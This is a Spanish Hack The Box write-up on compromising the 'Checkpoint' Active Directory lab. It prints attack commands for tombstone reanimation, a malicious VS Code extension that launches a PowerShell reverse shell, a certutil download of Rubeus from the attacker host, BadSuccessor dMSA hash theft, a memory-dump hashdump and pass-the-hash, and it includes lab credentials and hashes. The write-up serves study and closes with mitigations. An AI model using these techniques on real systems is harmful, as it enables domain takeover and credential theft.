---
title: "HTB Walkthrough: Checkpoint"
date: 2026-11-05
draft: false
description: "Walkthrough completo de la máquina Checkpoint de Hack The Box. Dificultad Media, Windows Server (Active Directory). Restauración de objeto AD eliminado → extensión VS Code maliciosa vía SMB → BadSuccessor (CVE-2025-53779) para obtener el hash NT de svc_deploy → volcado de memoria de VM → hash de Administrator → Pass-the-Hash."
tags: ["HackTheBox", "Windows", "Medium", "ActiveDirectory", "TombstoneReanimation", "VSCode", "VSIX", "BadSuccessor", "CVE-2025-53779", "dMSA", "VMDump", "Volatility", "PassTheHash", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Walkthrough de **Checkpoint** en Hack The Box. Máquina de dificultad **Media** con **Windows Server (Active Directory)**. Partiendo de credenciales de `alex.turner`, `bloodyAD` revela permiso de escritura sobre el tombstone de un objeto AD eliminado (**Mark Davies**); restaurarlo y reutilizar la misma contraseña da acceso de escritura al share `DevDrop`. Una extensión VS Code maliciosa (`.vsix`) subida a ese share se instala automáticamente y proporciona shell como `ryan.brooks`. Con un TGT de delegación falsa de Rubeus se aprovecha **BadSuccessor (CVE-2025-53779)**: una dMSA creada como "sucesora" de `svc_deploy` entrega su hash NT sin necesidad de conocer su contraseña. Con ese hash se accede al share `VMBackups`, se descarga un volcado de RAM de la VM del DC y Volatility extrae el hash del Administrador para un Pass-the-Hash final.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Windows{{< /badge >}}
{{< badge >}}Medium{{< /badge >}}

---

## 🗺️ Información de la Máquina

| Campo          | Detalle                                                                                                                                                                              |
|----------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **Nombre**     | Checkpoint                                                                                                                                                                           |
| **SO**         | Windows Server (Active Directory — `checkpoint.htb`)                                                                                                                                 |
| **Dificultad** | Media                                                                                                                                                                                |
| **IP**         | 10.129.14.190                                                                                                                                                                        |
| **Técnicas**   | AD Tombstone Reanimation · Extensión VS Code maliciosa (VSIX) · BadSuccessor CVE-2025-53779 (dMSA) · Volcado RAM de VM (Volatility) · Pass-the-Hash                                |

---

## 1. Reconocimiento

### 1.1 Escaneo de Puertos

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.14.190
```

```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
```

```bash
echo "10.129.14.190 dc01.checkpoint.htb checkpoint.htb" >> /etc/hosts
```

> **💡 Superficie de ataque:** el conjunto de puertos (88, 389, 445, 464, 3268, 9389) es la huella clásica de un **Controlador de Dominio**. El puerto 5985 (WinRM) ofrece acceso remoto si obtenemos una cuenta con permisos de login remoto.

### 1.2 Enumeración SMB con Credenciales Iniciales

Credenciales de partida: `alex.turner : Checkpoint2024!`

```bash
smbmap -H 10.129.14.190 -u alex.turner -p 'Checkpoint2024!' -d CHECKPOINT
```

```
Disk         Permissions  Comment
----         -----------  -------
ADMIN$       NO ACCESS    Remote Admin
C$           NO ACCESS    Default share
DevDrop      READ ONLY    VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
IPC$         READ ONLY    Remote IPC
NETLOGON     READ ONLY    Logon server share
SYSVOL       READ ONLY    Logon server share
VMBackups    NO ACCESS
```

> **💡 Hallazgo clave:** el share `DevDrop` describe explícitamente su propósito: *"VS Code extensions share for approved .vsix packages"* — lo que implica que algún proceso instala automáticamente los paquetes `.vsix` que aparezcan allí. `VMBackups` está sin acceso por ahora, pero el nombre apunta a volcados de máquinas virtuales.

### 1.3 Enumeración de Usuarios del Dominio

```bash
netexec smb 10.129.14.190 -u 'alex.turner' -p 'Checkpoint2024!' --users
```

```
-Username-        -Last PW Set-        -Description-
Administrator     2026-05-09 16:16:34
alex.turner       2026-05-09 09:00:08
ryan.brooks       2026-05-10 13:46:18
svc_deploy        2026-05-09 09:01:19  Deployment service account
james.harper      2026-05-09 09:02:53
[... 12 usuarios más ...]
max.palmer        2026-05-26 01:25:15
```

---

## 2. Enumeración de Permisos AD — Restauración de Objeto Eliminado

```bash
bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb \
  -u alex.turner -p 'Checkpoint2024!' get writable
```

```
distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
DACL: WRITE

distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: OU=Employees,DC=checkpoint,DC=htb
permission: CREATE_CHILD
```

> **💡 Hallazgo clave:** `alex.turner` tiene permiso de **WRITE** sobre el tombstone del objeto eliminado **Mark Davies**. En AD, los objetos eliminados se conservan en estado recuperable (*Tombstone Reanimation*) durante el periodo de retención configurado. Con permiso de escritura sobre el tombstone podemos restaurar el objeto — incluido su SID original — y fijarle una contraseña conocida.

```bash
bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb \
  -u alex.turner -p 'Checkpoint2024!' \
  set restore 'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'
```

```
[+] CN=Mark Davies ... has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
```

```bash
netexec smb 10.129.14.190 -u 'Mark.Davies' -p 'Checkpoint2024!'
```

```
SMB  10.129.14.190  445  DC01  [+] checkpoint.htb\Mark.Davies:Checkpoint2024!
```

```
Flujo normal:    objeto eliminado permanece en CN=Deleted Objects hasta caducar → inaccessible
Flujo malicioso: WRITE sobre tombstone + set restore → objeto recuperado con SID original
                 → reutilización de contraseña → Mark.Davies activo con permisos de escritura en DevDrop
```

> **💡 Por qué funciona:** la contraseña pre-eliminación se conserva en el tombstone y el atributo de expiración se restablece al restaurar el objeto. Que `alex.turner` tenga WRITE sobre el contenedor `Deleted Objects` es una delegación excesiva que permite a un atacante reactivar cuentas con SIDs históricos y posibles privilegios residuales.

---

## 3. Explotación — Extensión VS Code Maliciosa vía DevDrop

`Mark.Davies` tiene permisos de escritura en `DevDrop`. Un proceso automatizado instala los `.vsix` que aparecen en ese share — subir una extensión maliciosa es RCE sobre la estación del usuario que ejecuta ese proceso.

### 3.1 Construir la Extensión Maliciosa

```
hkt/
├── [Content_Types].xml
└── extension/
    ├── package.json
    └── extension.js
```

**`package.json`**

```json
{
  "name": "devtools-helper",
  "displayName": "DevTools Helper",
  "version": "1.0.0",
  "engines": {"vscode": "^1.118.0"},
  "activationEvents": ["*"],
  "main": "./extension.js",
  "contributes": {}
}
```

**`extension.js`**

```javascript
const cp = require('child_process');
exports.activate = function() {
  cp.exec('powershell -e <PAYLOAD_BASE64_REVERSE_SHELL>');
}
exports.deactivate = function() {}
```

```bash
zip -r htk.vsix '[Content_Types].xml' extension/
```

### 3.2 Subir el Payload y Recibir la Shell

```bash
nc -lvnp 4444
```

```bash
smbclient //10.129.14.190/DevDrop \
  -U 'checkpoint.htb/Mark.Davies%Checkpoint2024!' \
  -c "put htk.vsix htk.vsix"
```

```
putting file htk.vsix as \htk.vsix (8.6 kb/s)
```

```
Listening on 0.0.0.0 4444
Connection received on 10.129.14.190 49733
PS C:\Program Files\Microsoft VS Code> whoami
checkpoint\ryan.brooks
```

```
Flujo normal:    proceso instala extensión .vsix firmada → activa código legítimo
Flujo malicioso: .vsix maliciosa en share sin validación de firma → extension.js ejecuta reverse shell
                 → proceso con identidad de ryan.brooks → shell como ryan.brooks
```

---

## 4. User Flag

```powershell
cat C:\Users\ryan.brooks\Desktop\user.txt
```

> 🔑 User flag obtenida.

---

## 5. Escalada de Privilegios — BadSuccessor (CVE-2025-53779)

**BadSuccessor** es una vulnerabilidad en la gestión de **dMSA** (*delegated Managed Service Accounts*), un tipo de cuenta introducida en Windows Server 2025. Una dMSA puede configurarse como "sucesora" de una cuenta existente mediante `msDS-ManagedAccountPrecededByLink`: el DC le entrega las **claves Kerberos previas** de la cuenta a la que sustituye — sin necesidad de conocer su contraseña. Si un atacante tiene `CREATE_CHILD` sobre cualquier OU, puede crear una dMSA que "suceda" a cualquier cuenta privilegiada del dominio y obtener su hash NT directamente del TGS.

### 5.1 Obtener un TGT Utilizable con Rubeus

```powershell
certutil -urlcache -f http://10.10.14.211:8080/Rubeus.exe Rubeus.exe
.\Rubeus.exe asktgt /user:ryan.brooks /domain:checkpoint.htb /fakedeleg /nowrap
```

```
[+] Delegation request success!
[*] base64(ticket.kirbi): <TICKET_BASE64>
```

```bash
# En la máquina atacante
echo '<TICKET_BASE64>' > ticket.b64
base64 -d ticket.b64 > ryan.kirbi
impacket-ticketConverter ryan.kirbi ryan.ccache
export KRB5CCNAME=$(pwd)/ryan.ccache
```

### 5.2 Crear la dMSA Sucesora de svc_deploy

```bash
bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb \
  -u ryan.brooks -k ccache=ryan.ccache \
  add badSuccessor evil-dmsa \
  -t 'CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB' \
  --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb'
```

```
[+] Creating DMSA evil-dmsa$ in OU=DMSAHolder,DC=checkpoint,DC=htb
[+] Impersonating: CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB

dMSA previous keys found in TGS (including keys of preceding managed accounts):
RC4: e16081eb077aca74bdbf8af12af43ac9
```

```
Flujo normal:    dMSA se crea sin sucesor → solo tiene sus propias claves
Flujo malicioso: CREATE_CHILD en OU → dMSA declarada como sucesora de svc_deploy
                 → DC incluye claves Kerberos previas de svc_deploy en el TGS
                 → RC4 (NT hash) de svc_deploy extraído sin crackeo
```

> **🔑 Hash NT obtenido de svc_deploy:** `e16081eb077aca74bdbf8af12af43ac9` — extraído directamente del TGS sin conocer ni resetear la contraseña original.

### 5.3 Verificar Acceso como svc_deploy

```bash
netexec smb 10.129.14.190 -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9 --shares
```

```
Share      Permissions  Remark
-----      -----------  ------
VMBackups  READ
```

`svc_deploy` tiene ahora acceso de lectura a **VMBackups**.

---

## 6. Post-Explotación — Volcado de Memoria de VM y Extracción del Hash

### 6.1 Listar y Descargar el Volcado de RAM

```bash
smbclient //10.129.14.190/VMBackups \
  -U 'checkpoint.htb/svc_deploy%e16081eb077aca74bdbf8af12af43ac9' --pw-nt-hash
```

```
smb: \> cd "NightlyBackup_2024-11-01\memory forensics\"
smb: \> ls
Windows Server 2019-Snapshot1.vmem       A  2147483648
Windows Server 2019.vmdk                 A  10199695360
...

smb: \> get "Windows Server 2019-Snapshot1.vmem"
getting file ... (13663.4 KB/sec)
```

> **💡 Por qué el `.vmem`:** un fichero `.vmem` es un volcado crudo de la RAM de la VM en el instante del snapshot. Si el DC estaba en ejecución, ese volcado contiene las estructuras de LSASS con hashes NTLM en claro — recuperables con Volatility sin ningún acceso adicional al sistema operativo.

### 6.2 Extraer el Hash del Administrador con Volatility

```bash
vol -f 'Windows Server 2019-Snapshot1.vmem' windows.hashdump.Hashdump \
  | grep -i Administrator
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f29e9c014295b9b32139b09a2790be3b:::
```

> **🔑 Hash NT del Administrador obtenido:** `f29e9c014295b9b32139b09a2790be3b`

---

## 7. Acceso como Administrador — Pass-the-Hash

```bash
evil-winrm -i 10.129.14.190 -u Administrator -H f29e9c014295b9b32139b09a2790be3b
```

```
Evil-WinRM shell v3.5
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

---

## 8. Root Flag

```powershell
cat C:\Users\max.palmer\Desktop\root.txt
```

> 🏁 Root flag obtenida.

---

## 9. Resumen y Lecciones Aprendidas

**Cadena de compromiso:**

1. **Reconocimiento** → Nmap confirma DC Windows Server. SMB con `alex.turner` descubre shares `DevDrop` (auto-install VSIX) y `VMBackups` (sin acceso).
2. **Tombstone Reanimation** → `bloodyAD` revela WRITE sobre tombstone de Mark Davies → restauración del objeto → reutilización de contraseña `Checkpoint2024!` → acceso de escritura en `DevDrop`.
3. **VSIX maliciosa** → extensión VS Code con `extension.js` que ejecuta reverse shell → proceso automático la instala → shell como `ryan.brooks`.
4. **User flag** → `C:\Users\ryan.brooks\Desktop\user.txt`.
5. **BadSuccessor (CVE-2025-53779)** → TGT de delegación falsa con Rubeus → dMSA `evil-dmsa` sucesora de `svc_deploy` → NT hash de `svc_deploy` en el TGS sin crackeo.
6. **VMBackups** → acceso con hash de `svc_deploy` → descarga de `.vmem` (volcado RAM de DC virtualizado).
7. **Volatility** → `windows.hashdump.Hashdump` → NT hash del Administrador.
8. **Root** → Evil-WinRM Pass-the-Hash como `Administrator`.

**Qué aprendí de esta máquina:**

- **Los tombstones de AD son objetos con permisos propios — y los permisos erróneos en `CN=Deleted Objects` son una escalada.** Restaurar un objeto eliminado recupera su SID histórico y sus atributos (incluida la contraseña pre-eliminación si no ha expirado). La delegación de WRITE sobre `CN=Deleted Objects` debería ser tratada como una delegación de administrador de dominio.

- **Un share de despliegue automático sin verificación de firma es RCE sobre el sistema que lo consume.** El mecanismo de auto-instalación de extensiones VS Code desde `DevDrop` convierte el share en un vector de ejecución de código: quien pueda escribir en él puede ejecutar código como el usuario del proceso de instalación. Los artefactos de despliegue deben estar firmados criptográficamente y el mecanismo de instalación debe verificar la firma antes de ejecutar nada.

- **BadSuccessor (CVE-2025-53779) convierte `CREATE_CHILD` en cualquier OU en un Kerberoasting dirigido sin crackeo.** La premisa de dMSA es que "suceder" a una cuenta equivale a heredar sus claves Kerberos — el DC entrega el hash NT de la cuenta predecesora en el TGS sin ninguna comprobación de autorización adicional. Cualquier cuenta con `CREATE_CHILD` sobre una OU puede obtener el hash NT de cualquier cuenta del dominio, incluida la del Administrador, sin conocer ni resetear su contraseña.

- **Los volcados de RAM de máquinas virtuales son credenciales en disco.** Un `.vmem` de un DC virtualizado es funcionalmente equivalente a un volcado de LSASS — contiene los hashes NTLM de todas las sesiones activas en el momento del snapshot. Los backups de VMs deben cifrarse, el acceso a ellos debe estar estrictamente controlado, y los snapshots con datos sensibles deben eliminarse tras su uso operativo.

- **La reutilización de contraseñas entre cuentas amplifica el radio de cualquier compromiso.** Si Mark Davies hubiera tenido una contraseña distinta a la de las cuentas del mismo entorno, la restauración del tombstone habría sido un punto muerto. La unicidad de contraseñas por cuenta es la diferencia entre un hallazgo y una escalada.

**Mitigaciones:**

| Vector | Mitigación |
|--------|------------|
| WRITE sobre tombstones en `CN=Deleted Objects` | Revisar y restringir ACL sobre `CN=Deleted Objects`; auditar delegaciones en AD; aplicar mínimo privilegio |
| Reutilización de contraseñas entre cuentas del mismo entorno | Política de contraseñas únicas por cuenta; monitorizar reutilización con herramientas de auditoría de AD |
| Share de despliegue automático sin verificación de firma | Firmar criptográficamente los artefactos de despliegue; verificar firma antes de instalar; restringir escritura al share |
| BadSuccessor (CVE-2025-53779) — `CREATE_CHILD` en OU → hash NT de cualquier cuenta | Aplicar el parche de CVE-2025-53779; auditar y restringir delegaciones `CREATE_CHILD`; revisar quién puede crear dMSA |
| Delegación Kerberos no restringida (Fake Delegation TGT) | Deshabilitar delegación no restringida; usar delegación restringida basada en recursos solo donde sea necesario |
| Volcados de RAM de VMs accesibles por SMB sin cifrado | Cifrar backups y snapshots; restringir acceso al share `VMBackups`; eliminar snapshots sensibles tras uso operativo |
| Hashes NTLM extraíbles de volcados de memoria | Habilitar Credential Guard; reducir uso de NTLM donde sea posible; migrar a autenticación moderna |
